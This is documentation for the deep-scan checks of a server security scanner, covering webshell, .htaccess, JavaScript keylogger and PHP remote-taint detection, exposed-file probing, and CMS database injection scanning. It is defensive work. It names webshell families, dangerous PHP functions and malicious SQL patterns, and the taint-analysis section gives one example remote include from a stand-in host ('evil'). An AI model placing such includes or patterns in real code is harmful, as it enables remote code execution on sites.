# Deep Checks

Deep checks run every 60 minutes and cover thorough filesystem, CMS, email, and database scans.

Scheduled and account scan checks share one budget within the daemon, sized
from the machine's core count with a minimum of two and a maximum of five
concurrent checks. Web UI scans and CLI jobs submitted with `csm scan --full`
share this budget. Standalone CLI scans run in a separate process. A cancelled
or timed-out check retains its slot until it actually exits, while its caller
can return promptly. Waiting for slots occupied by another scan does not count
as stalled dispatch in queue health.

The real-time scanner has a separate pool of two to sixteen workers, also
sized from the core count. Its two-worker minimum lets other events progress
while one content scan is slow. Both the packaged and installer-generated
service units give CSM a lower CPU weight than the default. Under contention,
this favors sibling services with default weights while allowing scans to use
spare CPU on an idle host; it is not a CPU quota.

## Scan coverage alerts

PHP, JavaScript, YARA, host-wide WordPress database coverage, and unfinished email
password verification warnings keep one alert identity while their counts change.
They follow the daily reminder window unless acknowledged. When the owning scan
returns without that condition, its acknowledgment clears, so a later recurrence
can alert again. An unrelated scan, throttled check, timeout, or cancellation does
not prove recovery. Disabling a scanner clears its current coverage condition.
Existing per-install database limit acknowledgments are kept
when a partial scan cannot inspect those installations.

PHP analyzer crashes and stalls are tracked by the failing file paths, contents,
and failure statuses, including files outside the displayed examples. Different
failing inputs can therefore alert even after an earlier failure was dismissed.
Check crash alerts ignore stack-trace churn, keep account scans separate by
account, and re-arm after the same check returns successfully.

## Filesystem

| Check | Description |
|-------|-------------|
| `filesystem` | Backdoors, hidden executables, suspicious SUID binaries |
| `webshells` | Known webshell patterns (c99, r57, b374k, etc.) |
| `htaccess` | .htaccess injection (auto_prepend_file, eval, base64 handlers) plus nine hardened per-pattern detectors -- `htaccess_php_in_uploads`, `htaccess_auto_prepend`, `htaccess_user_agent_cloak`, `htaccess_spam_redirect`, `htaccess_filesmatch_shield`, `htaccess_header_injection`, `htaccess_errordocument_hijack`, `htaccess_cgi_handler_abuse`, `htaccess_security_disabled`. Auto-cleaning gated by `auto_response.clean_htaccess`. |
| `file_index` | Indexed file listing to detect new/unauthorized files |
| `php_content` | Suspicious PHP functions (exec, eval, system, passthru) |
| `group_writable_php` | World/group-writable PHP files (privilege escalation) |
| `js_keylogger_dataflow` | JavaScript keystroke exfiltration found by AST data-flow analysis: a key-event value that reaches fetch, sendBeacon, XHR, WebSocket, or a resource `.src` sink, including flows laundered through variables that regex rules cannot express. Runs inside the scheduled deep scan on the same file snapshots as the YARA pass but independent of the YARA backend, with its own rolling cursor. Complete sources up to 2 MiB are analyzed; a file the analyzer could not complete (oversize, parse failure, resource limit) is reported in the Warning-level `js_taint_scan_incomplete` aggregate and its prior finding is preserved, never silently cleared. Recognized PHP and HTML documents (including HTML-first PHP templates), complete JSON/source maps, CSS stylesheets, and gettext catalogs are skipped rather than counted as JavaScript parse failures. Classification uses content, not file extensions, and valid candidate JavaScript is always analyzed even when comments or strings contain document markers. Embedded JavaScript in templates or data files is not extracted or analyzed; PHP analysis and content rules do not provide equivalent JavaScript data-flow coverage. Ambiguous sources and malformed JavaScript retain their coverage warning, and oversize sources keep the size-limit warning. Disable with `js_keylogger_dataflow` (or the owner ID `js_taint_deep`) in `disabled_checks`; disabling the YARA scan does not disable this analyzer. |
| `symlink_attacks` | Symlink-based privilege escalation attempts |
| `exposed_files` | Web-downloadable sensitive files under document roots: version-control directories (`.git/`, `.svn/`, reported as `web_exposed_repo_metadata` and virtual-patched by denying the whole directory), database dumps, full-site backup archives, config/credential backups, PHP source-code backups, and `phpinfo.php` diagnostics. Each candidate is reported only after a headers-only reachability probe pinned to the vhost's configured serving IP confirms the server serves it (HTTP 200/206, non-executed body) -- files the server already blocks (403) and shipped samples such as `wp-config-sample.php` are never flagged. The domain is preserved for HTTP Host and TLS SNI, while DNS and front-end proxies are bypassed. The probe reads status and content type only, never the file body. The one exception is `phpinfo.php`: a 200 response alone cannot prove a dump, so CSM reads a bounded portion of that one response and reports `web_exposed_phpinfo` only when it contains real phpinfo output (the `PHP Version` banner in a dump-sized body); stub responses are not findings. Findings: `web_exposed_db_dump`, `web_exposed_backup_archive`, `web_exposed_config_leak`, `web_exposed_source_backup`, `web_exposed_phpinfo`, `web_exposed_sample_sql`. A plain SQL file with a sample/schema-specific name under framework/vendor scaffolding (`examples/`, `docs/`, `vendor/`, unpacked `*-main/` or `*-master/` directories) is reported as the lower-severity `web_exposed_sample_sql` warning. Archived, renamed, customer-named, and other ambiguous dumps stay Critical. Descent depth is bounded by `thresholds.exposed_file_scan_depth` (default 2, maximum 10). Optionally, `auto_response.virtual_patch_exposed_files` (`off`/`manual`/`auto`) writes reversible `.htaccess` `Require all denied` rules -- `manual` applies confirmed findings via `csm virtual-patch --apply`, while `auto` applies every confirmed class except warning-only sample SQL and honors `dry_run`. Recognized backup storage directories are denied as a unit so regenerated archives stay blocked. A zip whose name carries no backup wording is classified from its central directory instead, so an archive named after the site it holds is reported when it contains a site-root or structured CMS configuration path, a regular Joomla configuration file at any depth whose same case-sensitive folder also holds a regular Joomla core file, a document-root directory, or a database dump at the archive root; plugin and theme bundles offered as ordinary downloads stay quiet. The complete entry list is inspected within a fixed metadata budget, without extracting or decompressing payloads; an archive that exceeds the budget leaves the scan incomplete instead of silently clearing an earlier finding. Each change records a rollback entry; restore refuses to overwrite a later customer edit. Findings in this family can be re-checked, and the version-triggered startup sweep re-checks existing findings after verifier changes. A finding clears only after a complete vhost map provides an unambiguous current serving address, both origin protocols answer there, and the shared detection rule no longer confirms an exposure; phpinfo re-checks repeat the bounded body confirmation too. A missing local file alone is not enough. The re-check never falls back to DNS, so a domain that has migrated to another host leaves the finding open rather than clearing on a stranger's answer, and incomplete routing data or an unreachable or half-answered probe leaves it open too. |

The webshell, .htaccess, phishing and filesystem scans run on every deep cycle
alongside the file index, including while the realtime monitor is active: the
monitor reports neither a file renamed into place nor a setuid bit being set.
The exposed-file scan runs in that tier too, on its own interval, because it
confirms each candidate with a live request to the site rather than by reading
the file. A cycle that skips it on that interval leaves its existing findings
in place. The interval starts only after a complete exposure scan; an incomplete
attempt can retry on the next cycle, including after switching between full and
reduced scans.

Account discovery failures, unreadable directories or files, and truncated
backdoor candidate lists leave the affected scan incomplete. Its earlier
findings remain active until a complete scan can replace them; detections from
the incomplete attempt are still added. These rules apply to both deep tiers.

The file index runs on every deep cycle, including while the realtime monitor
is active. It checks new paths and rechecks indexed files with active findings;
being present in the baseline does not clear an alert. Failed content reads
preserve prior findings for that file. After a large deletion, scans rewalk the
directories until the smaller baseline is adopted, so cached entries cannot
restore removed paths or interrupt the consecutive-scan shrink guard.

The PHP content scan reuses a clean result only when the file's identity and
timestamps still match a stable read. Recently changed files, files that change
during inspection, and files without usable identity metadata are read again
on the next visit. Older cached results are refreshed as files are visited after
upgrading; interrupted scans retain progress. Every sixth host scan bypasses
the cache, and explicit full-content scans always read the files they visit.

PHP execution heuristics distinguish attribute metadata and multiline string
contents from executable calls. Literal examples do not establish callable
bindings or invoke them, and scanning continues through code after attributes.
Attribute declarations do not qualify as comment-only stubs for demotion.

## Re-verifying Findings

Repeated YARA worker buffer-scan failures are logged at most once per minute per
tracked error, with suppressed counts reported when the error recurs after
that window. If many distinct failures exhaust the tracking limit, additional
errors share a bounded summary instead of resetting suppression. Scan errors
still reach callers and preserve incomplete-scan reporting.

A finding records what was true when it was raised. The condition behind it is often resolved by someone else -- an operator cleans a file, a virtual patch denies an exposure -- and none of that moves CSM's own rules, so re-verification runs once per deep-scan cycle as well as when the re-check logic changes.

A scan retires a finding it did not raise again only for files it actually examined. Coverage is tracked per file and scanner: a gap that names a file -- one past the scan size limit, or one that could not be opened -- keeps that scanner's findings for the file and nothing else, while a gap with no path, such as a directory the walk could not enter or a stat that may hide a subtree, keeps every finding the scanner owns, because the unscanned range is unknown. This matters more than it sounds: a single oversized log that will never fit under the limit is a permanent gap, and treating it as a whole-scanner gap froze every finding on the host indefinitely.

Each family is re-checked by re-running the test that raised it, giving four outcomes:

- **Cleared.** The condition is provably gone: the file was removed, or the server no longer serves it as an exposure.
- **Demoted to Warning.** The flagged content is gone but the file changed since detection, so the cleanup cannot be proven byte-for-byte. The finding is kept -- an attacker must not be able to retire one by editing the file -- but it stops ranking beside live threats. Only a replacement proven inert qualifies: an empty file, or a comment-only PHP stub with a valid opening tag and no closing tag. A malformed opening tag can leave the file serving page content, so it does not qualify for demotion. This is an allow-list on purpose. A deny-list of dangerous shapes would make every omitted include, callback or inline script a way to buy a lower severity.
- **Restored.** A demoted finding whose replacement stops being inert returns to the severity it came from, so a second edit into a detection gap cannot leave live content sitting at Warning.
- **Left alone.** Anything uncertain: an unreachable or half-answered probe, a domain no longer served by this host, a replacement that changed while it was being read, a file that still matches.

A finding keeps its identity throughout; only its severity changes, because a finding's key is derived from its details. Every store mutation is conditional on the snapshot verification actually examined, so a scan or realtime alert that refreshes the same key while a re-check is in flight is never overwritten by the older verdict. An unconfirmed demotion also survives a scan that does not raise the finding again, since that scan is weaker evidence than the verifier that reads the file.

## PHP Remote-Source Taint Analysis

This analyzer runs as part of the scheduled deep-content scan, alongside the YARA and JavaScript consumers, and reports `php_remote_taint`. Disable it with `php_taint_deep` (or `php_remote_taint`) in `disabled_checks`.

**It runs in a separate process, and that is not an implementation detail.** A single file can put the underlying PHP parser into a state it never returns from, which no in-process deadline can interrupt. Analysis therefore happens in a supervised child process that is killed outright when a file exceeds its deadline; that file is reported as reduced coverage and the scan continues. Repeated failures are rate-limited so no single account can consume the scan budget, and the analyzer recovers without operator action. Whenever a file cannot be examined -- including when no worker is available -- it is reported as unexamined, never as clean. The byte check that decides whether a file could hold such a flow at all needs no parser, so it runs in the daemon itself: a file without a PHP open tag, a code-execution construct and a remote-fetching call is ruled out there and never reaches the worker. Cancellation during this byte check is still reported as unexamined.

CSM includes a PHP analyzer that looks for code fetching content from a remote server and then executing it, even when the fetch and the execution happen in different functions. This is a flow that regular expressions cannot express: matching it requires binding the value a fetch returns to the value handed to execution, which is beyond what YAML pattern rules or YARA-X can do.

The analyzer parses PHP source and tracks whether a value returned by a remote-fetching call reaches a code-execution construct (`eval`, `include`, `include_once`, `require`, `require_once`, `create_function`, or `assert` given a string argument), following the value through variable assignment, string concatenation, decoding calls, across function and method boundaries, and through a `file_put_contents` write into an `include` of the same path expression. `curl_exec`, `curl_multi_getcontent`, `wp_remote_get`, `wp_remote_retrieve_body`, and `fsockopen` are always treated as a remote source, whatever their argument. `file_get_contents` and `fopen` are dual-use: only these two calls have their argument inspected, and only when that argument carries an HTTP, HTTPS, FTP, FTPS, `php://input`, or `data://` scheme are they classified as a remote source rather than a local read. Not every `php://` stream counts as remote: `php://input` is request-controlled and treated as a source, while `php://memory`, `php://temp`, and a local `php://filter` resource are not -- though a filter wrapping a remote resource still carries its nested remote scheme and is classified accordingly. A URL used directly as a sink's own argument, with no acquiring call in between -- `include 'http://evil/x.php'` -- is out of scope: the pre-filter requires a source keyword before parsing is even attempted, and a bare remote include has none, so it is reported `not_candidate`, not analyzed.

Only two outcomes mean a file was actually examined: **analyzed** (parsing and the data-flow pass both completed) and **not candidate** (a fast pre-check proved the file cannot contain a reportable flow, without needing to parse it). Every other outcome -- oversize, a parse failure, a parser recovery that produced only a partial tree, an internal resource limit, cancellation, or an internal error -- is a coverage gap, not a clean result, and must never be read as "nothing to see here."

An oversize file is judged once more before it counts. Only a file whose leading bytes could be source of that language is reported. Both analyzers are handed every readable file the walk produces, and their own pre-check rejects the rest instantly -- but that pre-check never runs on a file too large to send, so without this step every large image, archive and compiled catalog on the host arrived as source the scan had failed to examine. PHP is judged by an opening tag anywhere in the inspected prefix, including after binary content. Binary content carrying PHP tokens can therefore remain reportable; the prefix alone cannot establish that it is inert. JavaScript has no such marker. A prefix without NUL is admitted; one containing NUL gets a conservative lexical check, since binary characters are legal in JavaScript literals and comments. Incomplete tokens and ambiguous syntax remain reportable. Neither gate looks for taint source or sink keywords in the prefix. A read that fails answers yes either way, because a file the scan could not examine is exactly what the report exists to name.

A finding's severity follows how firmly the source was shown to be remote: a decoder-confirmed remote fetch reaching execution is Critical, a fetch carrying a remote URL is High, and a dual-use call whose argument could not be resolved either way is a Warning for review. When one file contains several flows, its strongest flow sets the severity. The last group is where legitimate template compilers and cache layers land, so it is kept visible without paging anyone.

Each flow in a finding's details reads `source -> sink (confidence, basis)`, for example `curl_exec -> eval (high, always-remote)` or `file_get_contents -> include (low, unresolved)`. The basis says how the source was identified: `always-remote` (the call can only read over the network), `literal` (the argument text carries a remote scheme), `decoded` (the scheme appears only after escape or builtin decoding), `request` (a requester can supply the start of the path), `call-argument` (a call site in the same file passes the remote argument), or `unresolved` (the analyzer could not decide whether the argument is local or remote). The basis describes the strongest proof that reaches the sink, which can come from a different source call than the one the flow names. Some basis values appear only in later versions.

A finding's identity is its file, its severity and the source and sink pairs of its reported flows. Changes to the details wording or the basis do not show a dismissed finding again. Any change in those flows or severity, or a new file, does. When evidence is capped, basis ranking does not change which equal-confidence flows are retained.

The WordPress database scan reports what it could not fully inspect as
`db_content_scan_incomplete`, counting affected installs against the number
discovered and naming one bounded example config path per reason:
`unreadable_config`, `missing_credentials`, `unresolved_table_prefix`,
`query_failed` or `incomplete_content`. Example paths use ASCII escapes for
control characters, non-ASCII bytes, quotes and backslashes, with the existing
length limit applied after escaping. Content gaps include truncated or
unusable query results. A server regular-expression timeout is a statement-local
failure: independent checks continue, while the failed check keeps coverage
incomplete and preserves earlier findings. Hidden-link selection examines only
the leading and trailing parts of each value that the parser reads, so large
values cost no more than the parsed sample. When the parser joins those parts
into a complete value, selection examines them together too. Ordinary CSS
declarations are matched with literal searches; guarded expressions handle
commented and encoded styles without admitting unrelated page text. Comment
bodies are preserved during matching so normalization cannot change their
meaning. If the server stops a regular expression, the selection is repeated
without commented styles, so plain
and encoded styles stay covered while the coverage gap is still reported. Each
install counts once; installs sharing a failed database count as affected without
retrying its queries. Incomplete discovery
is reported separately in the details because additional installs may be
missing from the total. With no attributed reasons, including when discovery
stops before reaching any install, the generic three-cause sentence remains
the fallback. Multisite safety limits keep their own account-specific warning
and do not count again in the summary or hide unrelated failures. Installation
findings carry an opaque database scope; the host-wide coverage summary remains
unscoped. A complete installation scan retires
its resolved findings even when another installation fails. Failed or
undiscovered installations retain their findings in the same atomic store
transaction. Older findings without a database scope stay until reobserved or
until the whole scanner completes; CSM does not guess their database from
message text. A partial multisite scan keeps findings for its entire network.
Incomplete or interrupted scans protect earlier findings from eviction when
new results fill the active list, including when every database or discovery
attempt fails, the scanner times out, or an internal panic stops execution.
That protection applies to findings already in the active list. Newly detected
conditions compete for the remaining space under the normal priority order,
so repeatedly incomplete scans cannot grow the list beyond its cap. Retained
findings can still refresh their details without losing their first observation.
Credential aliases sharing a database scope must all complete before that scope
can retire findings, regardless of scan order. This includes an alias whose
database and table prefix are known but whose login credentials are missing.

Query diagnostics include the detector stage, failure class and numeric MySQL
error code. Repeated errors are counted together, with bounded detail when
many causes occur. Raw SQL, server error messages and credentials are never
included. Known statement errors, such as a missing table or column, leave
the scan incomplete but allow independent detectors to continue. Connection,
authentication and unknown failures stop further queries for that database.

Coverage the scan could not reach is reported as `php_taint_scan_incomplete`, which names how many files were affected and why -- a per-file status such as a timeout or a worker failure, or a location the walk could not read at all, where the affected files cannot even be listed. Panics and timeouts are reported in a separate aggregate so hard analyzer failures remain visible beside routine coverage limits. A file that had a finding and later becomes unexaminable keeps its previous finding rather than having it cleared.

Separately from the outcome, an analyzed file can still report reduced precision. Constructs that defeat static variable identity -- `extract()`, `compact()`, variable variables, a call dispatched through a value, an assignment target the analyzer cannot name, or a value a closure or arrow function captures from its enclosing scope -- are recorded alongside the result. A recorded loss means tracking stopped at that point and the file may hold a flow that was not followed; it is never left implicit. The capture case is recorded only when the captured value was itself tainted, so it marks a real loss rather than the mere presence of a closure.

The parser supports PHP syntax up to version 8.1. A file written against a newer PHP version may use constructs the parser does not recognize; when that happens, parsing recovers what it can but the result is incomplete, and the file is reported as reduced coverage (a partial parse) rather than analyzed, so an incomplete view is never presented as a complete one.

## WordPress

| Check | Description |
|-------|-------------|
| `wp_core` | Core file integrity via official WordPress.org checksums. A command timeout does not mark files as verified, and a timed-out re-check stays unresolved. Repeated verification failures produce `wp_core_unverified`. |
| `wp_plugin_inventory` | Reports persistent plugin inventory failures as `wp_plugin_inventory_unverified`. Shares the existing refresh and interval with the outdated and vulnerable plugin checks. |
| `nulled_plugins` | Cracked/nulled plugin detection |
| `outdated_plugins` | Plugins behind the latest release, graded by version gap |
| `vulnerable_plugins` | Installed plugins whose version matches a curated known-vulnerable feed (CISA-KEV + confirmed in-the-wild CVEs). Fires only from a fresh shared inventory when a parseable version is inside the affected range; patched, stale, and unparseable versions stay silent. Matched versions are High or Critical regardless of version gap, including inactive plugins because their files remain reachable. Alert-only (never disables a plugin). Toggle `detection.vulnerable_plugin_scanning`; accept one reviewed build via `detection.vulnerable_plugin_allow` (`slug@version`, case-insensitive). For an active install, a host engine that is `Off` or `DetectionOnly`, or a disabled account or vhost scope, marks the finding unprotected and raises it to Critical: no request filtering applies and no modsec audit record is written. When CSM ships a virtual patch for that CVE (`virtual_patch` in the feed) the alert says that patch cannot run; otherwise it claims only the filtering gap. An inactive install is never annotated -- its files are why it is reported, but WordPress does not load the vulnerable code path, so a missing filter says nothing about reachability. An addon domain is linked only to its exact cPanel-associated subdomain; unrelated parked, main, and addon sites that happen to share a document root do not inherit one another's disabled flags. Off cPanel, where CSM deploys no virtual patches and no per-vhost ModSecurity state exists, findings are left as the detector graded them. |
| `vulnerable_timthumb` | Bundled TimThumb (`timthumb.php` / `thumb.php`) image-resizer scripts, the abandoned library whose remote-code-execution bug (CVE-2011-4106) is a recurring WordPress entry point. Files are confirmed by TimThumb's own constants (not just filename) so generic thumbnail helpers are never flagged. A version below the last patch (`2.8.14`), an unparseable version, or an enabled WebShot / external-fetch feature is reported High; a patched-but-deprecated copy is a Warning to remove. The final release is suppressed only when `ALLOW_EXTERNAL`, `ALLOW_ALL_EXTERNAL_SITES`, and `WEBSHOT_ENABLED` are defined as false in executable PHP and none is also defined as true. Alert-only -- TimThumb is never auto-quarantined, since deleting it would break the theme. |
| `db_content` | Database injection (an external script loader on an ordinary HTTPS host that carries no attacker marker is reported once, as a Warning `db_options_new_external_script`, the first time that host appears in an option after the site's first scan; plugin status options that WordPress renders as dashboard notices -- LiteSpeed Cache's CDN setup summary and its stored message list -- are read by name instead and reported Critical as `db_options_plugin_notice_injection` when they carry markup that executes, because those rows hold plugin state and never site content, so neither host reputation nor the first-seen baseline applies and a payload stored before the site's first scan is still reported. The named notice rows are read without a script-only SQL filter; complete values up to 64 KiB are inspected, while oversized or malformed query rows mark the scan incomplete and retain prior findings. Notice findings are alert-only; stored JSON and serialized data are not rewritten by this check. If another finding triggers option cleanup, cleanup refuses to write while any executable notice markup remains, even when its host has no reputation marker. A value WordPress stored as JSON has every slash escaped, so script URLs are normalised before a host is extracted, in options, in posts, and in page-builder content), siteurl hijacking, rogue admins, spam, a sudden publishing flood measured against the site's own history (`db_post_volume_burst`; only on sites older than 400 days, with at least 50 recent posts and more than 5x everything published before -- a genuine content migration looks the same, so it is alert-only), spam categories, tags and other taxonomy terms left behind when spam posts are removed (`db_spam_taxonomy`; a term named after a URL is High, spam vocabulary alone is Warning), PHP-capable snippets stored in the database by WPCode (`db_stored_code_execution`, Critical when the snippet is published and therefore running, lower when it is a draft or trashed; stored code is invisible to filesystem scanning), stored snippets that both defeat request caching (true `DONOTCACHEPAGE`, false `WP_CACHE`, WordPress no-cache headers, or LiteSpeed's no-cache response header) and inspect the user agent for a search or SEO crawler (`db_stored_cloak_logic`, High when published and Warning otherwise; direct, concatenated, and ROT13 crawler names are recognised, while a snippet that already matched a malware signature carries the cloak as a bounded note rather than raising a second finding), outbound links wrapped in a container the page hides from readers (`db_hidden_link_injection`; an off-canvas container -- a large negative `left`/`top`/`text-indent` -- is High on its own, while `display:none`, `visibility:hidden` and fully transparent opacity need corroboration from a second linked domain in the same container or spam vocabulary, because themes legitimately hide panels that link out. Links back to the site's own registrable domain are ignored, and the scan is skipped when `siteurl`/`home` cannot be read, since every absolute link would then look external. Markup is tokenized rather than parsed into a tree, so nesting the injection past a tree parser's open-element limit does not hide it), autoloaded options named by a 32-character hex digest whose value base64-decodes to one complete PHP-serialized array (`db_hostname_keyed_option`; kits key the digest to the site's own hostname so one payload serves many sites, and both halves are required because plugins do write hashed cache keys and base64 alone is ordinary), rewrite rules pairing an exact `sitemap<N>.xml` route with `feed=xmlsitemap<N>` in the same rule (`db_doorway_sitemap_routes`; sitemap plugins add numbered rewrite rules too, so the matching number is what distinguishes a doorway cluster from paginated sitemaps). Bounded option reads that omit any stored bytes mark the scan incomplete, and that row does not produce a finding. The scan also reports published posts attributed to a user that does not exist (`db_phantom_post_author`, Critical at 100 posts or more and Warning below). Small orphan groups can result from direct SQL user deletion; large groups can identify doorway content whose invented author IDs are hidden from dashboard queries. Direct WordPress installs are covered at every document root the panel serves, at every addon-domain directory in an account home, and one directory below a document root, so a root the panel has stopped serving is still examined, and every finding states which of the two it came from -- served roots are reachable now, unserved ones hold a live database that publishes again as soon as a domain is pointed at them, and the statement is omitted entirely when the panel's domain map could not be read rather than guessing; account backup, cache, staging and metadata directories are not, and installs deeper than one directory below a document root are not discovered recursively. Discovery is shared with the object, admin-overlap, credential-reuse, core-integrity and plugin checks and with their fixers and re-checks, so a finding raised here can always be re-located by the code that resolves it. A site address is reported when its shape cannot be one -- a missing host, an invalid port, a backslash, a query string, a fragment, a script for a path, or a non-web scheme -- because WordPress builds every asset URL from it. Invalid-address findings are alert-only; only explicit code injection enters database auto-response. Serving a site under a domain hosted elsewhere is ordinary and is not reported on its own -- but a root the panel is serving right now, whose address names a domain absent from that account's panel domains, is reported once per site as `db_siteurl_foreign_host` (High). Ownership follows the panel's most-specific exact or wildcard domain mapping, so a delegated subdomain belongs to its own account rather than the account holding its parent. A migrated site is no longer served here, so the served state is what separates the two; an unserved root, an incomplete domain map, or a value the shape check already reports stays silent rather than saying it twice. Multisite-aware: when `wp-config.php` declares `define('MULTISITE', true)`, up to 100 active secondary blogs (`wp_<N>_options` / `wp_<N>_posts` for blog IDs from `wp_blogs`) are scanned alongside the unprefixed main-site tables; each blog's PHP-capable WPCode snippets and taxonomy are scanned, and its posts are checked against the network-wide users table. Larger networks emit `db_content_scan_incomplete` and retain prior findings. |
| `db_content_joomla` | Joomla database content scanning. Discovers installs via `configuration.php` containing `class JConfig`, parses credentials from `public $...;` assignments. Scans `<prefix>extensions` params, `<prefix>content` article bodies, and joins `<prefix>users` with `<prefix>user_usergroup_map` for Super User detection (group_id=8). Findings: `joomla_extensions_injection`, `joomla_content_injection`, `joomla_admin_injection`. Administrator rows are baselined on the first pass; only an administrator that appears later is reported, once, as High. Every query is capped at 200 rows and runs under the scan deadline; installs under addon-domain document roots are discovered too. |
| `db_content_drupal` | Drupal 8+ database content scanning. Discovers installs via `sites/default/settings.php` plus the `core/lib/Drupal.php` marker. Credentials parsed from the `$databases` array. Scans `config`, `node_revision__body`, and `users_field_data` joined with `user__roles` (administrator role). Findings: `drupal_settings_injection`, `drupal_content_injection`, `drupal_admin_injection`. Administrator rows are baselined on the first pass; only an administrator that appears later is reported, once, as High. Every query is capped at 200 rows and runs under the scan deadline; installs under addon-domain document roots are discovered too. Drupal 7 not yet covered. |
| `db_content_magento` | Magento 1.x and 2.x database content scanning. Discovers installs via `app/etc/env.php` (M2, preferred) or `app/etc/local.xml` (M1). Credentials parsed via `encoding/xml` for M1 (CDATA-aware) or field-level regex for M2. Scans `core_config_data`, `catalog_product_entity_text`, `cms_block`, `cms_page`, and `admin_user` (with the configured `db.prefix`). Findings: `magento_settings_injection`, `magento_content_injection`, `magento_admin_injection`. Administrator rows are baselined on the first pass; only an administrator that appears later is reported, once, as High. Every query is capped at 200 rows and runs under the scan deadline; installs under addon-domain document roots are discovered too. |
| `db_content_opencart` | OpenCart database content scanning. Discovers installs via the `config.php` + `admin/config.php` pair both containing `define('DB_DRIVER'`. Credentials parsed from `DB_HOSTNAME` / `DB_USERNAME` / `DB_PASSWORD` / `DB_DATABASE` / `DB_PREFIX` defines. Scans `<prefix>setting` (`config_url` / `config_ssl` are canonical hijack targets), `<prefix>product_description`, `<prefix>information_description`, and `<prefix>user` (admin/staff). Findings: `opencart_settings_injection`, `opencart_content_injection`, `opencart_admin_injection`. Administrator rows are baselined on the first pass; only an administrator that appears later is reported, once, as High. Every query is capped at 200 rows and runs under the scan deadline; installs under addon-domain document roots are discovered too. |
| `db_objects` | MySQL persistence mechanisms: triggers, events, stored procedures, stored functions. Critical when the body matches known-malware patterns (`sys_`+`exec`, `INTO OUTFILE`, `LOAD_FILE`, etc.); Warning when an object exists at all (vanilla CMSes ship none). Toggle with `detection.db_object_scanning`; suppress Warnings via `detection.db_object_allowlist`. Manual drop via `csm db-clean --drop-object`. |
| `admin_overlap` | WordPress administrator email overlap across cPanel accounts. Reports when the same admin email appears on the configured number of accounts, with reviewed emails and domains suppressible in `detection`. |
| `credential_reuse` | WordPress administrator password-hash reuse across cPanel accounts. Groups identical hashes with an in-memory fingerprint and reports only the affected accounts and count. |
| `supply_chain` | Composer and npm lockfile advisory matching against the local advisory database. Silent when no advisory file is present. |

Core verification and plugin inventory report persistent failures separately from
malware or integrity findings. A failed attempt first appears in status; repeated
failed attempts in distinct scan cycles raise a Warning naming the installation,
last attempt and a bounded reason category. A missing wp-cli or an unreachable
checksum service stops every installation on the host at once, so when one reason
covers more installations than the per-cause limit a host scan collapses the
warnings into a single finding naming that reason, the total and a sample of the
paths. The limit applies across accounts for each kind of verification and cause.
Account scans keep installation-specific warnings. A host summary belongs to an
account only when every affected installation shares it; sampled paths do not
determine account attribution. Raw wp-cli output is never stored in this history.
These warnings do not enter incidents or automatic remediation.
The history survives restarts, and successful checks clear the warnings through
the normal completed-scan merge. Overlapping scans preserve attempt order and
failure streaks even when they finish out of order. New discovery alone does not
discard an attempt still finishing in another scan.

Cache reads do not count as attempts. Plugin coverage uses
`thresholds.plugin_check_interval_min`; partial refreshes keep the existing
refresh policy. `disabled_checks` controls these scheduled checks, and plugin
coverage performs no refresh when both inventory consumers are disabled.
Cancellation and incomplete discovery retain earlier evidence. Complete discovery
removes installations that are no longer present, scoped to the account scanned.
A wp-cli refusal explicitly identifying a non-WordPress directory is recorded as
not applicable rather than an outage. A completed core check that finds modified
or missing files retains its existing integrity findings and is counted separately.
Only the completed checksum summary establishes a negative verification result;
partial warnings without that summary remain unverified.

`csm status`, `csm status --json` and `/api/v1/status` report the last observed
coverage for core verification and plugin inventory. These counts describe
previous attempts, not a fresh scan of every site. See
[verification status](api.md#wordpress-verification-coverage).

WordPress content findings use the account, database server, database name,
and table prefix to stay separate. Changes to the panel's document-root map do not create duplicate
findings. Publishing a previously inactive suspicious snippet, or an orphaned-post
group growing into a Critical content farm, produces a fresh alert even when the
earlier condition was baselined or dismissed. Ordinary count changes within the
same orphaned-post severity tier keep the existing identity.

Hidden-link findings are tracked per account, database host, database, and table
prefix. More affected rows or a different row order do not raise another alert
for the same destinations and concealment strength. Off-screen concealment
raises a new High even after an earlier Warning was baselined or dismissed.
Changes to destinations outside the displayed sample also produce a new finding.
The corrected identity can show existing hidden-link findings once more after
an upgrade; previous dismissals do not transfer to the new identity.

Hidden-link corroboration counts registrable domains within one hidden container, not hostnames across a whole row. Multiple subdomains of one linked domain count as one target, and both the WordPress home and site addresses count as local.

Joomla, Drupal, Magento, and OpenCart configuration reads accept regular files
up to 1 MiB. Configuration symlinks and special files are rejected, including
during Joomla and OpenCart marker probes. Drupal's version marker must also be
a regular file. Reads use the opened file throughout, reject changes observed
during the read, and stop when the scan is canceled. Read failures and missing
required credentials mark that CMS scan incomplete; manual re-checks keep the
finding unresolved when its configuration cannot be inspected.

Administrator baselines for Joomla, Drupal, Magento, and OpenCart are scoped to
the hosting account, CMS, database host, database name, and table prefix. Two
sites under one account keep separate baselines when they use different
databases or prefixes. Paths that share the same database and prefix share the
same administrator set. Upgrading from account-wide baselines starts a fresh
baseline for each installation on its first complete administrator query;
later additions produce one High finding per new administrator. Finding
details identify the affected database and prefix.

Database errors, discovery errors, and configuration or query limits keep the
affected CMS check incomplete. Earlier findings remain until that CMS completes
a scan; another CMS can still complete and clear its own resolved findings.
Queries inspect at most 200 rows and request one extra row to detect overflow.
Known statement errors allow independent queries to continue; connection
failures and overflow stop further queries for that installation. Administrator
baselines and recorded IDs change only after a complete result; a successful
empty administrator result also establishes a baseline. New IDs in a partial
result can still be reported against an existing baseline.

## CMS Scanner Support Policy

New CMS scanner work targets upstream-supported major versions. EOL versions are best-effort when the existing scanner covers them through the same low-risk layout or schema. Adding a new EOL-only scanner needs operator fleet data and an explicit security reason.

Current scanner scope:

- WordPress single-site and multisite.
- Joomla installs using the common `configuration.php` / `JConfig` layout and standard content/user tables used by supported Joomla releases.
- Drupal 8 and newer. Drupal 7 is not a planned support target.
- Magento 1 and 2.
- OpenCart installs using the standard storefront and admin config pair.

The supported kinds are declared once in `internal/cms`. The database
scanners and the PHP taint analyzer's knowledge of each CMS's bootstrap path
constants are tested against that table. The tests also require every typed
CMS kind constant, including local declarations and aliases, to have exactly
one descriptor. Membership drift fails the tests. The clean-corpus manifest
is validated against the same table: every supported CMS is either pinned as
a source or listed as pending with a reason. Support does not by itself mean
a CMS has clean-corpus false-positive evidence (see
[the clean corpus](clean-corpus.md)). Database object scanning (`db_objects`)
discovers WordPress installs only.

## Phishing & Malware

| Check | Description |
|-------|-------------|
| `phishing` | 8-layer phishing detection (kit directories, credential harvesting) |
| `email_content` | Outbound email body scanning for credentials and suspicious URLs |

## System Integrity

| Check | Description |
|-------|-------------|
| `rpm_integrity` | System binary verification via rpm -V |
